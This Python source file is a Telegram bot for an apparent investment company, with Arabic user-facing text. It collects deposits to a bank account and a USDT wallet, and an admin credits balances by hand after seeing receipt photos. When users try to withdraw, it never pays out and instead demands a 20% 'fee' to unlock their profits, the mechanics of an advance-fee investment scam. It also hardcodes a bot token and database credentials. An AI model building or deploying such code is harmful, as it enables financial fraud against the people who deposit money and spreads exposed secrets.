import os, urllib.parse, logging
from flask import Flask
from threading import Thread
from pymongo import MongoClient
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# --- ⚙️ 1. الإعدادات وسجل النظام ---
logging.basicConfig(format='%(asctime)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

flask_app = Flask('')
@flask_app.route('/')
def home(): return "🚀 Dragon System: Fully Operational"

def run_flask():
    flask_app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))

def keep_alive():
    t = Thread(target=run_flask); t.daemon = True; t.start()

# --- 🔑 2. البيانات الثابتة ---
TOKEN = '8731999916:AAHDjo1noyGIbUH699aTjNns9kCjP8P9SHc'
ADMINS = [6016547718]
SUPPORT = "https://t.me/HCICICVICIF9"

BANK_MSG = "🏦 **بيانات الحساب البنكي:**\n\nالراجحي: `123456789012345`\nالاسم: شركة سهم القابضة"
USDT_MSG = "🔗 **عنوان محفظة USDT (TRC20):**\n\n`TLtLuhkU2kkkR1Wz1TtrBTpoNRTNviYpsA`"

SAR_VALS = ["1000", "2000", "5000", "10000", "20000", "50000"]
USD_VALS = ["300", "500", "1000", "2000", "5000", "10000"]

# الاتصال بقاعدة البيانات
u_s, p_s = urllib.parse.quote_plus('Abduh'), urllib.parse.quote_plus('A11223344@5566')
MONGO_URI = f"mongodb+srv://{u_s}:{p_s}@cluster0.0a4wefx.mongodb.net/DragonFinal?retryWrites=true&w=majority"

try:
    client = MongoClient(MONGO_URI, serverSelectionTimeoutMS=5000)
    db = client.get_database()
    users_col = db['investors']
except:
    users_col = None

# --- 🛠️ 3. وظائف جلب البيانات ---
def get_user(uid):
    d = {"uid": int(uid), "sar": 0.0, "usd": 0.0, "t": 0}
    if users_col is None: return d
    try:
        res = users_col.find_one({"uid": int(uid)})
        return res if res else d
    except: return d

# --- 🏠 4. الواجهات والمعالجات ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    kb = [
        [InlineKeyboardButton("🇸🇦 استثمار (﷼)", callback_data='d_sr'), InlineKeyboardButton("🇺🇸 استثمار ($)", callback_data='d_us')],
        [InlineKeyboardButton("💳 محفظتي", callback_data='w'), InlineKeyboardButton("📈 صفقاتي", callback_data='tr')],
        [InlineKeyboardButton("📤 طلب سحب", callback_data='wd')],
        [InlineKeyboardButton("👨‍💻 الدعم الفني", url=SUPPORT)]
    ]
    txt = f"👑 **مرحباً بك في شركة سهم القابضة**\n\nالمستثمر: **{user.first_name}**\n\n_اختر فئة الاستثمار المناسبة لبدء جني الأرباح:_ "
    
    if update.message:
        await update.message.reply_text(txt, reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')
    else:
        await update.callback_query.edit_message_text(txt, reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')

async def cb_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; uid = q.from_user.id; data = q.data
    await q.answer()
    u = get_user(uid)

    if data == 'main': await start(update, context)
    
    elif data == 'w':
        txt = f"🏦 **رصيدك الحالي بالمحفظة:**\n\n🇸🇦 `{u.get('sar',0.0):,}` ﷼\n🇺🇸 `{u.get('usd',0.0):,}` $"
        await q.edit_message_text(txt, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data='main')]]), parse_mode='Markdown')

    elif data == 'tr':
        await q.edit_message_text(f"📈 **عدد صفقاتك النشطة:** `{u.get('t',0)}` \nالحالة: 🟢 نشط", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙", callback_data='main')]]))

    elif data == 'wd':
        # حساب الرسوم تلقائياً 20%
        r_sar = float(u.get('sar', 0)) * 0.20
        r_usd = float(u.get('usd', 0)) * 0.20
        txt = (f"📤 **طلب سحب الأرباح:**\n\n"
               f"💰 رصيدك المتاح: `{u.get('sar',0)}` ﷼ / `{u.get('usd',0)}` $\n\n"
               f"⚠️ **رسوم السحب المستحقة (20%):**\n"
               f"يتوجب عليك دفع مبلغ: `{r_sar:,.1f}` ﷼ أو `{r_usd:,.1f}` $\n\n"
               f"**يرجى دفع الرسوم المتوجبه عليك لفتح بوابة تحويل الارباح.**")
        await q.edit_message_text(txt, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data='main')]]), parse_mode='Markdown')

    elif data in ['d_sr', 'd_us']:
        curr = 'sr' if data == 'd_sr' else 'us'
        vals = SAR_VALS if curr == 'sr' else USD_VALS
        btns = [[InlineKeyboardButton(f"{v} {'﷼' if curr=='sr' else '$'}", callback_data=f"s_{curr}_{v}") for v in vals[i:i+2]] for i in range(0, 6, 2)]
        btns.append([InlineKeyboardButton("🔙 رجوع", callback_data='main')])
        await q.edit_message_text("📊 **اختر مبلغ الاستثمار المفضل:**", reply_markup=InlineKeyboardMarkup(btns))

    elif data.startswith('s_'):
        _, curr, amt = data.split('_')
        info = BANK_MSG if curr == 'sr' else USDT_MSG
        await q.edit_message_text(f"✨ **إيداع مبلغ {amt}:**\n\n{info}\n\n📸 **أرسل صورة الإيصال الآن ليتم التفعيل.**", parse_mode='Markdown')

    elif data.startswith(('ok', 'no')):
        if uid not in ADMINS: return
        if data.startswith('ok'):
            _, c, a, tid = data.split('_')
            key = "sar" if c == "sr" else "usd"
            if users_col:
                users_col.update_one({"uid": int(tid)}, {"$inc": {key: float(a), "t": 1}}, upsert=True)
            await q.edit_message_caption("✅ تم شحن الحساب بنجاح!")
            try: await context.bot.send_message(tid, f"🎊 مبروك! تم شحن `{a}` {'﷼' if key=='sar' else '$'} في محفظتك بنجاح.")
            except: pass
        else: await q.edit_message_caption("❌ تم رفض الإيصال.")

async def photo_h(update: Update, context: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    await update.message.reply_text("⏳ تم استلام إيصالك.. جاري المراجعة من الإدارة.")
    kb = [[InlineKeyboardButton(f"﷼ {p}", callback_data=f"ok_sr_{p}_{u.id}") for p in ["1000", "5000", "10000"]]]
    kb += [[InlineKeyboardButton(f"$ {p}", callback_data=f"ok_us_{p}_{u.id}") for p in ["300", "1000", "5000"]]]
    kb.append([InlineKeyboardButton("🚫 رفض الإيصال", callback_data=f"no_{u.id}")])
    for adm in ADMINS:
        await context.bot.send_photo(adm, update.message.photo[-1].file_id, caption=f"🔔 إيداع من: {u.first_name}\nID: `{u.id}`", reply_markup=InlineKeyboardMarkup(kb))

# --- 🚀 5. التشغيل ---
if __name__ == '__main__':
    keep_alive()
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler('start', start))
    app.add_handler(CallbackQueryHandler(cb_handler))
    app.add_handler(MessageHandler(filters.PHOTO, photo_h))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), start))
    app.run_polling(drop_pending_updates=True)
